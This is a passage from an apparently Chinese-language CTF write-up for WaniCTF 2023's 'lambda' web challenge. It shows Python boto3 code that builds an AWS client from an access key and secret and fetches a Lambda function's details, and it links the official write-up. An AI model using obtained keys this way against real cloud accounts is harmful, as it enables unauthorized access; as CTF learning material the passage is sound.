                      aws_access_key_id=access_key_id,
                      aws_secret_access_key=secret_access_key,
                      region_name=region)

response = client.get_function(FunctionName="wani_function")

pprint(response)
```
官方[wp](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/lambda)给的是命令行的解法。